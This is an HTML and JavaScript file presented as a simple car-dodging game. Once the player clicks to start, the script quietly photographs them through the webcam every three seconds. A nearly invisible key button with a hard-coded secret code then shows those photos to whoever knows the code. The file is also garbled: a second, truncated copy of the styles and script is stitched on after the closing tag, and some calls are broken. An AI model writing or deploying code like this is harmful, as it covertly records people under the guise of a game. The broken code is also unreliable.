<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Car Game</title>
    <style>
        #gameContainer {
            width: 800px;
            height: 400px;
            border: 1px solid black;
            position: relative;
            overflow: hidden;
        }
        
        #car {
            width: 120px;
            height: 160px;
            background-color: red;
            position: absolute;
            left: 375px;
            bottom: 50px;
        }
        /* Car details */
        #car::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 60px;
            background-color: darkred;
        }
        #car::after {
            content: '';
            position: absolute;
            bottom: -20px;
            left: 0;
            width: 100%;
            height: 40px;
            background-color: black;
        }
        .wheel {
            width: 25px;
            height: 25px;
            background-color: black;
            border-radius: 50%;
            position: absolute;
        }
        #front-wheel {
            bottom: -35px;
            left: 20px;
        }
        #back-wheel {
            bottom: -35px;
            right: 20px;
        }
        #windshield {
            position: absolute;
            top: 0;
            width: 100%;
            height: 60px;
            background-color: lightblue;
        }
        #obstacle {
            width: 40px;
            height: 40px;
            background-color: blue;
            position: absolute;
            right: -40px;
            bottom: 70px;
        }
        #secretButton {
            position: fixed;
            top: 10px;
            right: 10px;
            padding: 5px;
            background-color: transparent;
            border: none;
            color: white;
            cursor: pointer;
        }
        #capturedPhotos {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            padding: 20px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <button id="secretButton">🔑</button>
    <div id="gameContainer">
        <canvas id="gameCanvas" width="800" height="400"></canvas>
        <div id="car">
            <div class="wheel" id="front-wheel"></div>
            <div class="wheel" id="back-wheel"></div>
            <div id="windshield"></div>
        </div>
        <div id="obstacle"></div>
    </div>
    <script>
        let videoStream = null;
        let imageCapture = null;
        let capturedImages = [];
        const secretCode = "vamsi jacks"; // Secret code set to "vamsi jacks"
        // Access camera and start game
        document.querySelector("#gameContainer").addEventListener('click', function() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    videoStream = stream;
                    imageCapture = new ImageCapture(videoStream.getVideoTracks()[0]);
                    
                    // Start capturing images every 3 seconds
                    setInterval(() => {
                        imageCapture.takePhoto()
                            .then(blob => {
                                return blob.toBlob();
                            })
                            .then(blob => {
                                let url = URL.createObjectURL(blob);
                                capturedImages.push(url);
                            });
                    }, 3000);
                    startGame();
                })
                .catch(err => console.error("Error accessing camera: ", err));
        });
        function startGame() {
            // Car movement
            const car = document.getElementById('car');
            let carPosition = 375;
            document.addEventListener('keydown', (e) => {
                if(e.key === 'ArrowLeft') {
                    carPosition -= 20;
                    car.style.left = carPosition + 'px';
                }
                else if(e.key === 'ArrowRight') {
                    carPosition += 20;
                    car.style.left = carPosition + 'px';
                }
            });
            // Obstacle movement
            let obstaclePosition = -40;
            setInterval(() => {
                obstaclePosition += 5;
                document.getElementById('obstacle').style.right = (800 - obstaclePosition) + 'px';
                // Check collision
                if(obstaclePosition > 375 && obstaclePosition < 435) {
                    gameOver();
                }
            }, 50);
        }
        function gameOver() {
            alert("Game Over!");
            videoStream.getTracks().forEach(track => track.stop());
        }
        // Secret button functionality
        document.getElementById('secretButton').addEventListener('click', () => {
            const userInput = prompt("Enter the secret code:");
            if(userInput === secretCode) {
                displayCapturedPhotos();
            } else {
                alert("Wrong code!");
            }
        });
        function displayCapturedPhotos() {
            let photosDiv = document.getElementById('capturedPhotos');
            photosDiv.style.display = 'block';
            
            capturedImages.forEach((image, index) => {
                let img = document.createElement('img');
                img.src = image;
                img.style.maxWidth = '200px';
                img.style.margin = '5px';
                photosDiv.appendChild(img);
            });
        }
    </script>
</body>
</html>            top: 10px;
            right: 10px;
            padding: 5px;
            background-color: transparent;
            border: none;
            color: white;
            cursor: pointer;
        }
        #capturedPhotos {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            padding: 20px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <button id="secretButton">🔑</button>
    <div id="gameContainer">
        <canvas id="gameCanvas" width="800" height="400"></canvas>
        <div id="car"></div>
        <div id="obstacle"></div>
    </div>
    <script>
        let videoStream = null;
        let imageCapture = null;
        let capturedImages = [];
        const secretCode = "yoursecretcode"; // Set your secret code here
        // Access camera and start game
        document.querySelector("#gameContainer").addEventListener('click', function() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    videoStream = stream;
                    imageCapture = new ImageCapture(videoStream.getVideoTracks()[0]);
                    
                    // Start capturing images every 3 seconds
                    setInterval(() => {
                        imageCapture.takePhoto()
                            .then(blob => {
                                return blob.toBlob();
                            })
                            .then(blob => {
                                let url = URL.createObjectURL(blob);
                                capturedImages.push(url);
                            });
                    }, 3000);
                    startGame();
                })
                .catch(err => console.error("Error accessing camera: ", err));
        });
        function startGame() {
            // Car movement
            const car = document.getElementById('car');
            let carPosition = 375;
            document.addEventListener('keydown', (e) => {
                if(e.key === 'ArrowLeft') {
                    carPosition -= 20;
                    car.style.left = carPosition + 'px';
                }
                else if(e.key === 'ArrowRight') {
                    carPosition += 20;
                    car.style.left = carPosition + 'px';
                }
            });
            // Obstacle movement
            let obstaclePosition = -40;
            setInterval(() => {
                obstaclePosition += 5;
                document.getElementById('obstacle').style.right = (800 - obstaclePosition) + 'px';
                // Check collision
                if(obstaclePosition > 375 && obstaclePosition < 435) {
                    gameOver();
                }
            }, 50);
        }
        function gameOver() {
            alert("Game Over!");
            videoStream.getTracks().forEach(track => track.stop());
        }
        // Secret button functionality
        document.getElementById('secretButton').addEventListener('click', () => {
            const userInput = prompt("Enter the secret code:");
            if(userInput === secretCode) {
                displayCapturedPhotos();
            } else {
                alert("Wrong code!");
            }
        });
        function displayCapturedPhotos() {
            let photosDiv = document.getElementById('capturedPhotos');
            photosDiv.style.display = 'block';
            
            capturedImages.forEach((image, index) => {
                let img = document.createElement('img');
                img.src = image;
                img.style.maxWidth = '200px';
                img.style.margin = '5px';
                photosDiv.appendChild(img);
            });
        }
    </script>
</body>
</html>
